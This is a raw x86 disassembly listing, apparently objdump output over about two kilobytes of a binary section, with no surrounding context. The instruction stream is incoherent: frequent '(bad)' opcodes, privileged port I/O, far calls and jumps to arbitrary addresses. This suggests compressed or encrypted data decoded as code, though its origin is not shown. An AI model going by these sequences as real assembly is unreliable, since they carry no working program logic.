  4182a6:	lods   eax,DWORD PTR ds:[esi]
  4182a7:	lods   al,BYTE PTR ds:[esi]
  4182a8:	or     ch,bl
  4182aa:	or     DWORD PTR [esi-0x5c321542],ebx
  4182b0:	(bad)  
  4182b1:	pop    eax
  4182b2:	pushf  
  4182b3:	add    BYTE PTR [ebp+0x10],cl
  4182b6:	sti    
  4182b7:	xchg   ebp,eax
  4182b8:	xor    bh,BYTE PTR [esi]
  4182ba:	cld    
  4182bb:	shl    DWORD PTR [esi+0x7fb1b80e],0xb8
  4182c2:	aaa    
  4182c3:	lock jbe 0x418265
  4182c6:	fcmovu st,st(7)
  4182c8:	(bad)  
  4182c9:	mov    eax,0x591022e4
  4182ce:	call   0x133c:0x28680bab
  4182d5:	push   edi
  4182d6:	mov    dh,0xd3
  4182d8:	sub    eax,DWORD PTR [eax-0x18770b31]
  4182de:	fldenv [edx+0x255c8036]
  4182e4:	mov    ds:0x63b88cc3,al
  4182e9:	cdq    
  4182ea:	fs das 
  4182ec:	(bad)  
  4182ed:	aas    
  4182ee:	dec    edi
  4182ef:	pop    ds
  4182f0:	and    DWORD PTR [ecx],0xffffff8c
  4182f3:	pop    ecx
  4182f4:	mov    esp,0x9706e445
  4182f9:	xchg   ebp,eax
  4182fa:	and    bh,BYTE PTR [ebp+0x13f5d13d]
  418300:	in     al,0xd3
  418302:	iret   
  418303:	shl    DWORD PTR [edi],0x7f
  418306:	mul    BYTE PTR [ebp-0x18c612cd]
  41830c:	mov    ebp,0xc734cb90
  418311:	push   cs
  418312:	mov    cl,0xd9
  418314:	fs dec edi
  418316:	cmp    ebp,eax
  418318:	mov    esi,0x6a11ff9f
  41831d:	data16 or bh,BYTE PTR [eax-0x1e440350]
  418324:	or     eax,0x2933fa56
  418329:	and    cl,BYTE PTR [esi]
  41832b:	jae    0x4182ed
  41832d:	adc    DWORD PTR [edx-0xe68f0f8],esp
  418333:	jle    0x41835d
  418335:	rcl    cl,0xe7
  418338:	in     eax,0x2d
  41833a:	(bad)  
  41833b:	inc    esi
  41833c:	out    dx,eax
  41833d:	ins    BYTE PTR es:[edi],dx
  41833e:	or     dl,BYTE PTR [edx+0x50]
  418341:	out    0x48,eax
  418343:	jno    0x4182c6
  418345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418346:	ins    DWORD PTR es:[edi],dx
  418347:	inc    edi
  418348:	cs test eax,0xf584c3d1
  41834e:	call   0x5172:0x4742e6f8
  418355:	sub    eax,0x3a77d811
  41835a:	mov    al,0xda
  41835c:	retf   
  41835d:	push   esi
  41835e:	jb     0x418375
  418360:	(bad)  
  418361:	into   
  418362:	pop    ebx
  418363:	inc    edx
  418364:	(bad)
  418368:	fucomp st(0)
  41836a:	jbe    0x41831d
  41836c:	shr    ecx,1
  41836e:	(bad)  
  41836f:	icebp  
  418370:	sqrtps xmm0,xmm0
  418373:	hlt    
  418374:	cmp    DWORD PTR [ecx],0xffffffd5
  418377:	xor    ebx,DWORD PTR [ecx]
  418379:	ins    BYTE PTR es:[edi],dx
  41837a:	xor    eax,0x1c3517f9
  41837f:	ja     0x4183d0
  418381:	sub    ebx,DWORD PTR [edi]
  418383:	(bad)  
  418384:	retf   0xc19d
  418387:	popf   
  418388:	mov    WORD PTR [ecx+0x21a8ce4],fs
  41838e:	retf   0x8ccd
  418391:	mov    esp,DWORD PTR [eax+0x4a]
  418394:	inc    esp
  418395:	retf   
  418396:	rol    DWORD PTR [ecx-0x6b9e0262],1
  41839c:	test   BYTE PTR [esi],0x38
  41839f:	call   0x9343:0x4239e78
  4183a6:	push   esi
  4183a7:	retf   0xfa5b
  4183aa:	mov    al,0x0
  4183ac:	or     ah,al
  4183ae:	mov    ebp,0xaa238303
  4183b3:	test   ebp,ebx
  4183b5:	out    dx,al
  4183b6:	sahf   
  4183b7:	fdivr  QWORD PTR ds:0x9910a817
  4183bd:	or     edx,DWORD PTR [ecx+0x68]
  4183c0:	push   0x31b72621
  4183c5:	nop
  4183c6:	ds leave 
  4183c8:	xchg   edi,eax
  4183c9:	retf   
  4183ca:	lds    edi,FWORD PTR [esi+0x46]
  4183cd:	ja     0x418392
  4183cf:	jo     0x418383
  4183d1:	pop    ebx
  4183d2:	lahf   
  4183d3:	cli    
  4183d4:	xchg   BYTE PTR [ecx+ecx*1+0x7bafd58f],ah
  4183db:	popa   
  4183dc:	xor    ebx,DWORD PTR [ebx+0x2f33c64a]
  4183e2:	cmp    al,0x7b
  4183e4:	mov    esi,0xe2382eb
  4183e9:	xchg   BYTE PTR [ecx-0x4e5c4a2a],ch
  4183ef:	mov    ah,0x43
  4183f1:	jecxz  0x41841e
  4183f3:	xor    ebp,DWORD PTR [eax-0x2676c335]
  4183f9:	inc    ebx
  4183fa:	add    BYTE PTR [edi-0x871f7c1],0x2d
  418401:	out    0xc1,al
  418403:	outs   dx,BYTE PTR ds:[esi]
  418404:	inc    esp
  418405:	xor    al,BYTE PTR [edx+0x22ff8745]
  41840b:	xchg   esp,eax
  41840c:	push   cs
  41840d:	sub    al,0x48
  41840f:	lds    esp,FWORD PTR [eax]
  418411:	xchg   DWORD PTR [ebx],ebx
  418413:	aas    
  418414:	retf   0xbdc3
  418417:	cmp    al,0x85
  418419:	outs   dx,DWORD PTR ds:[esi]
  41841a:	fstp   QWORD PTR [esi]
  41841c:	jg     0x4183ce
  41841e:	inc    eax
  41841f:	adc    eax,0x913b095b
  418424:	or     BYTE PTR [ebx-0x3],dh
  418427:	xor    ebx,DWORD PTR [edx]
  418429:	xor    al,0x49
  41842b:	fldln2 
  41842d:	jmp    0x418401
  41842f:	mov    cl,al
  418431:	outs   dx,DWORD PTR ds:[esi]
  418432:	imul   ecx,DWORD PTR [edi],0xc3878111
  418438:	jge    0x4184ae
  41843a:	in     al,dx
  41843b:	jns    0x418400
  41843d:	cmp    al,0xe5
  41843f:	xchg   ecx,eax
  418440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418441:	mov    al,0xdd
  418443:	clc    
  418444:	icebp  
  418445:	pop    esp
  418446:	out    0x40,al
  418448:	add    DWORD PTR [ebp-0x323fa85f],eax
  41844e:	outs   dx,DWORD PTR ds:[esi]
  41844f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418450:	jl     0x41846e
  418452:	ins    DWORD PTR es:[edi],dx
  418453:	xchg   edi,eax
  418454:	aas    
  418455:	pop    ds
  418456:	mov    edi,DWORD PTR [eax]
  418458:	xchg   esp,eax
  418459:	clc    
  41845a:	pushf  
  41845b:	paddsw mm3,QWORD PTR [edi+esi*2-0x35174d4f]
  418463:	add    bl,BYTE PTR [ebp+0x69]
  418466:	jne    0x41848f
  418468:	mov    bl,0x68
  41846a:	js     0x418480
  41846c:	or     eax,0x5fac7c4d
  418471:	cmp    DWORD PTR [ebx],ecx
  418473:	mov    ah,0x1d
  418475:	pop    eax
  418476:	sbb    DWORD PTR [ecx+0xf0dca04],esi
  41847c:	jmp    DWORD PTR [esi]
  41847e:	jb     0x418407
  418480:	rcr    cl,0xa3
  418483:	adc    ch,ch
  418485:	addr16 sahf 
  418487:	stos   DWORD PTR es:[edi],eax
  418488:	(bad)
  41848b:	test   eax,0x542603cf
  418490:	jbe    0x4184ff
  418492:	mov    dl,0x91
  418494:	in     al,0xe6
  418496:	sbb    al,BYTE PTR [ecx+0x54]
  418499:	sahf   
  41849a:	je     0x4184cd
  41849c:	repz mul DWORD PTR [ecx+0x40]
  4184a0:	call   0x25861e7e
  4184a5:	xor    al,0x73
  4184a7:	fld    QWORD PTR [edi-0x1d]
  4184aa:	out    0xfc,eax
  4184ac:	iret   
  4184ad:	push   ebx
  4184ae:	cmp    DWORD PTR [ebp-0x5b],esi
  4184b1:	mov    BYTE PTR [eax-0x5e761c67],dh
  4184b7:	cdq    
  4184b8:	jno    0x4184f6
  4184ba:	add    al,0x25
  4184bc:	jmp    DWORD PTR [edi]
  4184be:	cmp    edx,DWORD PTR [edx-0x73]
  4184c1:	mov    ds:0x257cf9ed,al
  4184c6:	and    al,BYTE PTR [ebx]
  4184c8:	pop    eax
  4184c9:	jle    0x41847b
  4184cb:	imul   edi,DWORD PTR [ebp+0x16bfdd48],0x5a2ddea2
  4184d5:	aaa    
  4184d6:	fisttp QWORD PTR [ebx+eiz*1-0x1a]
  4184da:	fidiv  DWORD PTR [ebx-0x67614595]
  4184e0:	and    bl,BYTE PTR [ebx+0x74]
  4184e3:	addr16 das 
  4184e5:	inc    ebp
  4184e6:	push   0xffffffb8
  4184e8:	jecxz  0x4184fd
  4184ea:	ins    BYTE PTR es:[edi],dx
  4184eb:	fwait
  4184ec:	aad    0xc7
  4184ee:	iret   
  4184ef:	mov    dl,BYTE PTR [eax+0x17]
  4184f2:	xlat   BYTE PTR ds:[ebx]
  4184f3:	and    eax,0x7116f4f7
  4184f8:	or     al,0x16
  4184fa:	(bad)  
  4184fb:	std    
  4184fc:	inc    edi
  4184fd:	loopne 0x4184db
  4184ff:	pop    esi
  418500:	int    0x24
  418502:	je     0x4184f4
  418504:	cmp    DWORD PTR [eax-0x18],ecx
  418507:	into   
  418508:	xor    DWORD PTR [ebp-0x79f6c58],eax
  41850e:	ja     0x41853b
  418510:	xor    bh,dl
  418512:	es aaa 
  418514:	call   0xdf44e0cd
  418519:	pop    edx
  41851a:	out    dx,al
  41851b:	xor    DWORD PTR [ecx],ebp
  41851d:	or     DWORD PTR [edi+0x5920a3a4],esp
  418523:	mov    ebp,0x1f555444
  418528:	dec    ebp
  418529:	mov    esi,0x52724e5b
  41852e:	inc    esi
  41852f:	inc    edi
  418530:	leave  
  418531:	or     esi,DWORD PTR [ebx+0x49]
  418534:	retf   
  418535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418536:	lds    ecx,FWORD PTR [edx-0x22]
  418539:	jmp    0xbb4f36b5
  41853e:	retf   0x6d45
  418541:	or     eax,0xf2392fc5
  418546:	pop    ebx
  418547:	cli    
  418548:	push   ebx
  418549:	jno    0x418567
  41854b:	jns    0x4184e7
  41854d:	pop    eax
  41854e:	and    BYTE PTR [edi+0x7f8261d9],ah
  418554:	scas   al,BYTE PTR es:[edi]
  418555:	or     DWORD PTR cs:[ecx+0x28991766],edi
  41855c:	inc    edi
  41855d:	cli    
  41855e:	inc    ebx
  41855f:	mov    ecx,0xc1031ce3
  418564:	mov    eax,DWORD PTR [eax-0x21]
  418567:	in     al,0x60
  418569:	xor    DWORD PTR [edi+edi*2+0xdd62ec4],edi
  418570:	loopne 0x418534
  418572:	push   ss
  418573:	and    DWORD PTR [edx+0x68173ba7],edi
  418579:	test   BYTE PTR [eax],cl
  41857b:	jmp    0x4185ef
  41857d:	pop    edx
  41857e:	in     eax,dx
  41857f:	sti    
  418580:	push   cs
  418581:	ds popa 
  418583:	mov    dl,ch
  418585:	xchg   ebx,eax
  418586:	popa   
  418587:	fist   DWORD PTR [esi+0x4a]
  41858a:	pop    eax
  41858b:	sbb    dh,dh
  41858d:	je     0x41858b
  41858f:	mov    ebp,0x775344d4
  418594:	pop    esp
  418595:	sbb    BYTE PTR [edi+0x1fa7be72],ah
  41859b:	fiadd  DWORD PTR [ebx+0x70387c7e]
  4185a1:	mov    BYTE PTR [edi],cl
  4185a3:	int3   
  4185a4:	and    edx,edx
  4185a6:	jno    0x418531
  4185a8:	stos   DWORD PTR es:[edi],eax
  4185a9:	push   edi
  4185aa:	mov    esi,0x2885535d
  4185af:	pusha  
  4185b0:	add    ch,BYTE PTR [esi-0xb16cd04]
  4185b6:	jmp    0xce79776
  4185bb:	mov    edx,0xf1af2a8a
  4185c0:	mov    edx,DWORD PTR [edx]
  4185c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185c3:	xchg   ebp,eax
  4185c4:	pop    esp
  4185c5:	sbb    ah,bl
  4185c7:	or     ebp,esi
  4185c9:	push   0x97cddf8d
  4185ce:	mov    ch,0x9f
  4185d0:	add    dl,dl
  4185d2:	call   0xfaef:0x5c258af
  4185d9:	(bad)
  4185dd:	or     eax,0x9bcbdde
  4185e2:	sub    al,0x2a
  4185e4:	lea    eax,[eax]
  4185e6:	fcomp  DWORD PTR [ebx-0x4a26c5ed]
  4185ec:	mov    bl,0x1b
  4185ee:	sub    eax,0xbab836d8
  4185f3:	xchg   ebp,eax
  4185f4:	cmp    BYTE PTR [ebp+esi*8+0x1f772a20],ch
  4185fb:	sub    ecx,DWORD PTR [esi-0xa5eaabb]
  418601:	pop    esi
  418602:	or     BYTE PTR [esi],dh
  418604:	idiv   BYTE PTR [edx+0x32a1604f]
  41860a:	sti    
  41860b:	jbe    0x418633
  41860d:	je     0x41858f
  41860f:	sti    
  418610:	(bad)  
  418611:	dec    ecx
  418612:	xchg   BYTE PTR [ecx],al
  418614:	xor    al,0xf3
  418616:	mov    ?,WORD PTR [eax]
  418618:	mov    BYTE PTR [edx],bh
  41861a:	mov    eax,0x1b0f176a
  41861f:	xor    BYTE PTR [ebx+0x78],bl
  418622:	rol    DWORD PTR [ecx-0x21],1
  418625:	iret   
  418626:	das    
  418627:	cdq    
  418628:	sbb    BYTE PTR [edx+0x39],cl
  41862b:	mov    ebp,0x16b343a3
  418630:	pop    ebx
  418631:	(bad)  
  418632:	int    0xd1
  418634:	pop    ss
  418635:	dec    eax
  418636:	push   ds
  418637:	jb     0x418645
  418639:	imul   ebx,DWORD PTR [esi-0x77a1ab93],0xffffff8d
  418640:	xor    eax,0x4f307660
  418645:	cli    
  418646:	lods   al,BYTE PTR ds:[esi]
  418647:	fstp   QWORD PTR [esi+0x6e]
  41864a:	gs (bad) 
  41864c:	and    bh,bh
  41864e:	and    al,0xb5
  418650:	mov    bh,0x1c
  418652:	add    BYTE PTR [eax],bl
  418654:	mov    dl,0xf4
  418656:	ret    0x219a
  418659:	sub    edx,ebp
  41865b:	add    BYTE PTR [ebx],al
  41865d:	push   edi
  41865e:	xlat   BYTE PTR ds:[ebx]
  41865f:	mov    al,ds:0x46ee06a1
  418664:	ins    DWORD PTR es:[edi],dx
  418665:	sbb    ecx,ebx
  418667:	call   FWORD PTR [esi]
  418669:	iret   
  41866a:	jnp    0x41862b
  41866c:	sub    BYTE PTR [edi],al
  41866e:	mov    ah,0x6a
  418670:	scas   eax,DWORD PTR es:[edi]
  418671:	sub    ebx,ebp
  418673:	mov    edi,0xebda2e80
  418678:	jae    0x4186ec
  41867a:	sbb    ch,BYTE PTR [edx-0x72]
  41867d:	in     eax,dx
  41867e:	lds    ebp,FWORD PTR [ebp-0x544ed29b]
  418684:	(bad)  
  418685:	cmp    eax,0x8834521c
  41868a:	mov    esi,0x570adebf
  41868f:	jmp    0x41869e
  418691:	mov    cl,dl
  418693:	xchg   edi,eax
  418694:	ds dec edi
  418696:	cmp    BYTE PTR [edx-0x17223ea4],dl
  41869c:	ffreep st(1)
  41869e:	loop   0x418717
  4186a0:	xor    bh,BYTE PTR [eax]
  4186a2:	int    0x55
  4186a4:	mov    WORD PTR [edi-0x57],?
  4186a7:	data16 xor ch,bl
  4186aa:	sub    al,0x29
  4186ac:	icebp  
  4186ad:	xchg   ecx,eax
  4186ae:	and    al,0x1b
  4186b0:	dec    esp
  4186b1:	test   edx,ecx
  4186b3:	addr16 xchg edx,eax
  4186b5:	pop    ebp
  4186b6:	sti    
  4186b7:	jae    0x4186a6
  4186b9:	sbb    cl,BYTE PTR [edx]
  4186bb:	ror    BYTE PTR [esi+eax*4],cl
  4186be:	sbb    eax,0xc44c0d64
  4186c3:	or     eax,DWORD PTR [edx+0x3d]
  4186c6:	jns    0x418711
  4186c8:	xchg   ebx,eax
  4186c9:	sub    cl,dl
  4186cb:	xchg   DWORD PTR [ebx],edi
  4186cd:	xchg   ebp,eax
  4186ce:	cmp    dl,bl
  4186d0:	xchg   DWORD PTR [ebp-0x1b272d4a],edi
  4186d6:	dec    esp
  4186d7:	cmp    eax,0xb5d89b41
  4186dc:	mov    edx,0x8060d8ed
  4186e1:	inc    eax
  4186e2:	ja     0x41874f
  4186e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186e5:	mov    ah,0x17
  4186e7:	pop    es
  4186e8:	leave  
  4186e9:	bound  ebx,QWORD PTR [ecx-0x1a]
  4186ec:	in     eax,0x93
  4186ee:	stos   BYTE PTR es:[edi],al
  4186ef:	rcr    BYTE PTR [ebx-0x15],1
  4186f2:	div    DWORD PTR [eax]
  4186f4:	pop    esp
  4186f5:	aam    0xc0
  4186f7:	fcomp  DWORD PTR [ebp-0x2c]
  4186fa:	jae    0x4186a4
  4186fc:	push   ebx
  4186fd:	jg     0x41869a
  4186ff:	fstp   DWORD PTR [edi]
  418701:	ss xchg ebp,eax
  418703:	adc    ch,BYTE PTR [ecx]
  418705:	lods   al,BYTE PTR ds:[esi]
  418706:	adc    dh,BYTE PTR [bx]
  418709:	(bad)  
  41870a:	ja     0x4186e8
  41870c:	push   edi
  41870d:	scas   al,BYTE PTR es:[edi]
  41870e:	mov    cl,0xe1
  418710:	xor    edx,esp
  418712:	mov    cl,0xcd
  418714:	int3   
  418715:	xchg   DWORD PTR [eax],ebp
  418717:	mov    BYTE PTR [esi+ecx*8],dl
  41871a:	jae    0x4186f3
  41871c:	test   eax,0x88e1796e
  418721:	hlt    
  418722:	int    0xf5
  418724:	xchg   edi,eax
  418725:	(bad)  
  418726:	and    dl,BYTE PTR fs:[esi+edi*4+0x77f2862e]
  41872e:	cmp    BYTE PTR [ecx+0xf],0xa5
  418732:	daa    
  418733:	add    edi,DWORD PTR [edx+esi*2+0x44bc1438]
  41873a:	clc    
  41873b:	xor    al,0x85
  41873d:	leave  
  41873e:	mov    dh,0x24
  418740:	xchg   esi,eax
  418741:	pop    ecx
  418742:	pop    ebx
  418743:	addr16 pop es
  418745:	(bad)  
  418746:	shl    BYTE PTR [ebx+esi*8+0x70],1
  41874a:	out    dx,al
  41874b:	ds cs pop ebx
  41874e:	int3   
  41874f:	pop    esp
  418750:	xchg   edi,eax
  418751:	jg     0x418717
  418753:	sbb    BYTE PTR [ecx+0x23c21736],0x1
  41875a:	jbe    0x4186dd
  41875c:	jp     0x4187b5
  41875e:	jo     0x418735
  418760:	sar    DWORD PTR [ebx],0x5a
  418763:	or     eax,0xcd97d898
  418768:	and    BYTE PTR [esi+0x7be2ba22],bh
  41876e:	adc    al,0x99
  418770:	in     al,dx
  418771:	adc    dh,BYTE PTR [ebx-0x7a]
  418774:	jge    0x418746
  418776:	or     ah,BYTE PTR [ecx-0x4cc44d87]
  41877c:	and    eax,0x3c3d6b08
  418781:	pop    ecx
  418782:	out    0xf9,eax
  418784:	jmp    0xa73e5605
  418789:	mov    dl,0x2d
  41878b:	js     0x4187d4
  41878d:	pop    ebp
  41878e:	and    eax,eax
  418790:	mov    WORD PTR [edi],?
  418792:	jne    0x4187c9
  418794:	push   0x65c99e45
  418799:	mov    esi,0x2306c23c
  41879e:	pop    ss
  41879f:	call   0x7351:0xba036cb1
  4187a6:	pop    ss
  4187a7:	mov    ebp,0x5569497d
  4187ac:	add    eax,0x8f327a5
  4187b1:	fsub   DWORD PTR [ecx+ecx*4]
  4187b4:	stos   DWORD PTR es:[edi],eax
  4187b5:	test   BYTE PTR ds:0xb033d97f,0x43
  4187bc:	in     al,0xb1
  4187be:	ror    DWORD PTR [eax-0x30d8982c],cl
  4187c4:	retf   0xb991
  4187c7:	jnp    0x418803
  4187c9:	xor    esi,ecx
  4187cb:	mov    edx,0xc4ba7760
  4187d0:	retf   0x16e7
  4187d3:	sub    edi,eax
  4187d5:	adc    edx,DWORD PTR [edi-0x12fb59b]
  4187db:	cmp    ebp,eax
  4187dd:	xlat   BYTE PTR ds:[ebx]
  4187de:	loop   0x4187ab
  4187e0:	mov    esi,es
  4187e2:	sbb    BYTE PTR [esi+0x4f],0x60
  4187e6:	mov    bl,0x1b
  4187e8:	cld    
  4187e9:	scas   eax,DWORD PTR es:[edi]
  4187ea:	fdiv   st,st(2)
  4187ec:	xchg   ebx,eax
  4187ed:	mov    ds:0x797ecd9e,al
  4187f2:	xor    esi,DWORD PTR [ecx+0x5275b6fd]
  4187f8:	aam    0x7b
  4187fa:	adc    al,0x8b
  4187fc:	dec    esi
  4187fd:	sbb    cl,BYTE PTR [eax+0x44]
  418800:	cmp    BYTE PTR [eax+0x17d8ab4c],0xc
  418807:	clc    
  418808:	fcomp  QWORD PTR [esi+esi*8-0x60]
  41880c:	sub    eax,0x7edaa3be
  418811:	rol    BYTE PTR [ecx-0x751f75c3],0x16
  418818:	adc    eax,0x844c6a37
  41881d:	iret   
  41881e:	int    0xc5
  418820:	aam    0x84
  418822:	mov    bl,0x9c
  418824:	aas    
  418825:	inc    esp
  418826:	push   0x95645914
  41882b:	loopne 0x418812
  41882d:	out    0xd4,al
  41882f:	xor    al,0xbc
  418831:	aad    0xa9
  418833:	ret    0xdce4
  418836:	push   ecx
  418837:	jnp    0x4187c8
  418839:	cmp    eax,DWORD PTR [edx]
  41883b:	mul    BYTE PTR [ecx]
  41883d:	cdq    
  41883e:	int    0xcc
  418840:	push   ss
  418841:	jp     0x418826
  418843:	jg     0x418891
  418845:	inc    eax
  418846:	fs inc ebx
  418848:	fnstsw ax
  41884a:	pop    ebx
  41884b:	mov    eax,0x2c72bb75
  418850:	jge    0x418804
  418852:	jns    0x41881b
  418854:	push   ebp
  418855:	jl     0x4188a4
  418857:	icebp  
  418858:	imul   edx,ebp,0xa1b4add2
  41885e:	adc    DWORD PTR [edi+0x5a],esi
  418861:	jg     0x4188a6
  418863:	cmp    al,0xe
  418865:	js     0x41884e
  418867:	push   eax
  418868:	or     DWORD PTR [eax-0x4be85922],edi
  41886e:	mov    ebx,0xa30ae921
  418873:	loop   0x4188bc
  418875:	nop    DWORD PTR [esi]
  418878:	sbb    BYTE PTR [edi],dl
  41887a:	xchg   ebx,eax
  41887b:	pop    ebx
  41887c:	push   ds
  41887d:	mov    ecx,0x51bb8d4a
  418882:	outs   dx,BYTE PTR ds:[esi]
  418883:	xchg   edi,eax
  418884:	mov    esp,edi
  418886:	xchg   ecx,eax
  418887:	and    BYTE PTR [eax+0x3f],ah
  41888a:	add    eax,eax
  41888c:	int3   
  41888d:	xor    eax,DWORD PTR [ebx]
  41888f:	test   DWORD PTR [edi+0x43d78199],0x35185ec7
  418899:	bnd ret 0xf767
  41889d:	xchg   ecx,eax
  41889e:	add    ah,al
  4188a0:	je     0x418822
  4188a2:	adc    eax,0xba53f0cb
  4188a7:	ja     0x41889b
  4188a9:	push   ecx
  4188aa:	sub    al,0xd4
  4188ac:	pop    es
  4188ad:	jge    0x41888a
  4188af:	loope  0x4188c3
  4188b1:	sub    al,0xd8
  4188b3:	je     0x4188d2
  4188b5:	mov    ch,0xd0
  4188b7:	or     eax,0x2b8e3346
  4188bc:	ror    ebx,0xac
  4188bf:	aam    0xb7
  4188c1:	dec    esi
  4188c2:	addr16 js 0x4188ce
  4188c5:	mov    al,0xaf
  4188c7:	mov    esi,0x1707f8b3
  4188cc:	test   al,0x9b
  4188ce:	sahf   
  4188cf:	test   DWORD PTR [eax],eax
  4188d1:	mov    al,0x90
  4188d3:	adc    bh,BYTE PTR [edx]
  4188d5:	sub    dl,BYTE PTR [eax+eax*2]
  4188d8:	bound  ebx,QWORD PTR [edi-0x4e9eaa21]
  4188de:	std    
  4188df:	sar    BYTE PTR [edx+0x4a979935],0xa
  4188e6:	mov    edi,esi
  4188e8:	jp     0x4188d1
  4188ea:	pop    eax
  4188eb:	ins    DWORD PTR es:[edi],dx
  4188ec:	in     eax,dx
  4188ed:	jnp    0x418884
  4188ef:	stc    
  4188f0:	jmp    0x41892b
  4188f2:	add    DWORD PTR [ecx],ebx
  4188f4:	imul   esi,ebp,0x7c07d0dc
  4188fa:	js     0x41894a
  4188fc:	stos   BYTE PTR es:[edi],al
  4188fd:	push   edi
  4188fe:	dec    eax
  4188ff:	(bad)  
  418900:	gs cmp al,cl
  418903:	inc    ebp
  418904:	(bad)  
  418905:	out    0x40,eax
  418907:	xor    BYTE PTR ds:[eax-0x60],ah
  41890b:	add    DWORD PTR [ecx+0x79],esp
  41890e:	xor    BYTE PTR [ebx+0x26],dl
  418911:	pop    eax
  418912:	pop    esp
  418913:	mov    edi,0x2932b554
  418918:	out    dx,al
  418919:	sub    eax,0xce299e67
  41891e:	rol    BYTE PTR [eax],0x1c
  418921:	loop   0x418964
  418923:	push   esi
  418924:	shl    DWORD PTR [edx+ebx*4],0xe1
  418928:	hlt    
  418929:	jae    0x41895c
  41892b:	cmp    DWORD PTR [edi-0x71],esi
  41892e:	jp     0x41894c
  418930:	mov    al,ds:0x893d2b5f
  418935:	in     eax,0x65
  418937:	(bad)  [ecx-0x5c]
  41893a:	arpl   WORD PTR [ebx],di
  41893c:	lods   al,BYTE PTR ds:[esi]
  41893d:	je     0x2495170d
  418943:	outs   dx,DWORD PTR ds:[esi]
  418944:	inc    edi
  418945:	xchg   esi,eax
  418946:	leave  
  418947:	lds    edi,FWORD PTR [edx+0x4b]
  41894a:	jbe    0x41895a
  41894c:	xchg   ebx,eax
  41894d:	add    esp,DWORD PTR [ecx+0x32]
  418950:	and    eax,0x568a0490
  418955:	mov    ds:0x8a93d64a,eax
  41895a:	es sbb ebx,eax
  41895d:	inc    al
  41895f:	in     eax,0xec
  418961:	lea    ecx,[eax+0x742d9299]
  418967:	outs   dx,BYTE PTR ds:[esi]
  418968:	mov    ecx,0x21c36b30
  41896d:	nop
  41896e:	js     0x4189a3
  418970:	push   esp
  418971:	fdivr  QWORD PTR [edx+0x70]
  418974:	les    ebx,FWORD PTR [ecx-0x1c]
  418977:	inc    ecx
  418978:	mov    ebp,0xb980a1f3
  41897d:	je     0x418978
  41897f:	in     al,dx
  418980:	jecxz  0x41894f
  418982:	pop    ecx
  418983:	aad    0x0
  418985:	mov    cl,0x2f
  418987:	jmp    0x8d048bc0
  41898c:	push   0xffffff9f
  41898e:	xlat   BYTE PTR ds:[ebx]
  41898f:	xchg   DWORD PTR [ecx+0x543faef],ecx
  418995:	xor    ebx,edx
  418997:	cmp    eax,0x640ad36f
  41899c:	jge    0x418a0b
  41899e:	xor    DWORD PTR [edi],esp
  4189a0:	ret    0x372d
  4189a3:	pushf  
  4189a4:	ds callw 0xb0f2
  4189a9:	inc    ecx
  4189aa:	(bad)  
  4189ab:	adc    BYTE PTR [edi+0x55953034],bl
  4189b1:	and    esi,edi
  4189b3:	out    0x5f,eax
  4189b5:	mov    eax,ebx
  4189b7:	add    dh,bl
  4189b9:	add    ebx,eax
  4189bb:	icebp  
  4189bc:	cmp    ecx,DWORD PTR [edi+0x2]
  4189bf:	adc    BYTE PTR fs:[esi-0x3c],dl
  4189c3:	adc    eax,0x939b7ed
  4189c8:	lds    ebp,FWORD PTR [edx]
  4189ca:	aam    0x1
  4189cc:	xchg   ebp,eax
  4189cd:	xor    DWORD PTR [edx],ebx
  4189cf:	ret    0x53f8
  4189d2:	xchg   edx,eax
  4189d3:	mov    edx,0x8ed014ad
  4189d8:	mov    dl,BYTE PTR [eax+0x21]
  4189db:	sbb    WORD PTR [ebx],0x8fcc
  4189e0:	aad    0xc
  4189e2:	xor    al,0xf9
  4189e4:	loop   0x418981
  4189e6:	and    DWORD PTR [ecx-0x46c49f67],edi
  4189ec:	daa    
  4189ed:	clc    
  4189ee:	mov    bh,0x77
  4189f0:	sub    BYTE PTR es:[edx+ebx*4-0x15ed51e3],al
  4189f8:	imul   ebx,DWORD PTR [ecx+eax*1-0x604aa12d],0x14022153
  418a03:	ins    BYTE PTR es:[edi],dx
  418a04:	sub    cl,0xf7
  418a07:	cmp    edi,DWORD PTR [edx]
  418a09:	imul   ebp,DWORD PTR [ecx+0x72],0xfd38f845
  418a10:	add    BYTE PTR [ecx-0x1a],ch
  418a13:	das    
  418a14:	add    BYTE PTR [ecx-0x3f1f1873],ch
  418a1a:	inc    ecx
  418a1b:	mov    edx,0x78172776
  418a20:	mov    dh,0xcf
  418a22:	cld    
  418a23:	adc    bl,dl
  418a25:	pop    ebx
  418a26:	fwait
  418a27:	jl     0x418a2f
  418a29:	mov    ebp,0x98784e2b
  418a2e:	sar    BYTE PTR [ebx+0x49a82d9],0x97
  418a35:	std    
  418a36:	or     BYTE PTR [ecx+0x7],dh
  418a39:	lock cmp DWORD PTR [ebx],0xffffffbb
  418a3d:	or     edx,DWORD PTR [ecx-0x11]
  418a40:	add    DWORD PTR [eax+0x79d77e2b],0x481b4bf0
  418a4a:	mov    al,0xd5
  418a4c:	inc    edi
  418a4d:	or     eax,0x5680b392
  418a52:	(bad)  
  418a53:	ins    DWORD PTR es:[edi],dx
  418a54:	js     0x418ad5
  418a56:	rol    BYTE PTR [eax-0x647511c6],1
  418a5c:	inc    edx
  418a5d:	pop    ds
  418a5e:	popa   
  418a5f:	mov    eax,0x797fe664
  418a64:	jns    0x4189eb
  418a66:	fstp   DWORD PTR [ecx-0x13]
  418a69:	int    0x18
  418a6b:	mov    bh,BYTE PTR [ecx+0x6186d0e1]
  418a71:	inc    ecx
  418a72:	jb     0x418aac
  418a74:	xchg   ebx,eax
  418a75:	adc    BYTE PTR [edi],cl
  418a77:	xchg   esp,eax
  418a78:	mov    al,0x2d
  418a7a:	mov    ecx,0x4d825c2
  418a7f:	(bad)  
  418a81:	xchg   BYTE PTR [ebx+0x70],bl
  418a84:	std    
  418a85:	jle    0x418a86
  418a87:	adc    eax,0xaf988c61
  418a8c:	push   ebp
  418a8d:	xor    DWORD PTR [ebp-0x50],edx
  418a90:	out    0x25,al
  418a92:	pop    edi
  418a93:	cwde   
  418a94:	out    dx,eax
  418a95:	mov    ecx,0x26c0363a
  418a9a:	or     DWORD PTR [edi+0x74],0x48
  418a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
